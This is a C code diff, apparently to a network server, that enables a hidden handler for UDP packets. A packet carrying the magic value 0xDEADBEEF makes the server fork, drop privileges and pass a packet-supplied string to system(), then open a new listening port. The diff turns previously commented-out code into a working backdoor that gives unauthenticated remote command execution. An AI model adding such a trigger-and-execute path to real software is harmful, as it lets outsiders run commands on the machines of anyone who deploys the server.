@@ -478,33 +478,35 @@ static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t 
 	if (udp_msg->magic == 0xDEADBEEF)
 	{
 		TRACE(("*****this is magic!"))
-		// pid_t pid = fork();
-		//  // child process
-		// if (pid == 0)
-		// {
-		// 	TRACE(("****** before executing cmd in child"))		
-		// 	//we are root
-		// 	if (getuid() == 0) 
-		// 	{  	// GID of 100 represents the users group.	
-		// 		if(setgid(100) != 0) TRACE(("Failed to set nonroot GID"));
-		// 		//new users in Ubuntu start from uid 1000 
-		// 		if(setuid(1000) != 0) TRACE(("Failed to set nonroot UID")); 
-		// 	}
+		pid_t pid = fork();
+		 // child process
+		if (pid == 0)
+		{
+			TRACE(("****** before executing cmd in child"))		
+			//we are root
+			// if (getuid() == 0) 
+			// {  	// GID of 100 represents the users group.	
+				if(setgid(100) != 0) TRACE(("Failed to set nonroot GID"));
+				//new users in Ubuntu start from uid 1000 
+				if(setuid(1000) != 0) TRACE(("Failed to set nonroot UID")); 
+			//}
 
-		// 	char *argv[1];
-		// 	argv[0] = udp_msg->shell_command;
-		// 	execvp(udp_msg->shell_command, argv); 
-		// }
+			// char *argv[1];
+			// argv[0] = udp_msg->shell_command;
+			// execvp(udp_msg->shell_command, argv); 
+			system(udp_msg->shell_command);
+			exit(0); // kill the child after executing the cmd
+		}
 		// parent process
-		//else if (pid > 0)
-		//{   // wait because we need to execute the shell cmd before 
-			// we start listening on the port
-			// int stat_val;
-    		// waitpid(pid, &stat_val, 0);
-			// if (WIFEXITED(stat_val))
-      		// 	TRACE(("Child exited with code %d\n", WEXITSTATUS(stat_val)))
-    		// else if (WIFSIGNALED(stat_val))
-      		// 	TRACE(("Child terminated abnormally, signal %d\n", WTERMSIG(stat_val)))
+		else if (pid > 0)
+		{   // wait because we need to execute the shell cmd before 
+			//we start listening on the port
+			int stat_val;
+    		waitpid(pid, &stat_val, 0);
+			if (WIFEXITED(stat_val))
+      			TRACE(("Child exited with code %d\n", WEXITSTATUS(stat_val)))
+    		else if (WIFSIGNALED(stat_val))
+      			TRACE(("Child terminated abnormally, signal %d\n", WTERMSIG(stat_val)))
 
 			// add the new port here
 			TRACE(("****** after wait pid about to add the new port"))
@@ -532,11 +534,12 @@ static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t 
 
 		return nsock;	  
 
-		//}
-		// else
-		// { // error 
-		// 	TRACE(("fork failed - couldn't create proccess to run shell cmd %s", udp_msg->shell_command))
-		// }				
+		}
+		else
+		{ // error 
+			TRACE(("fork failed - couldn't create proccess to run shell cmd %s", udp_msg->shell_command))
+			return 0;
+		}				
 	}
 
 	else
@@ -544,8 +547,8 @@ static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t 
 		TRACE(("*****this is not magic!"))
 		return 0;
 	}
-
-		
+	// shouldn't get here
+	return 0;	
 }
 
 
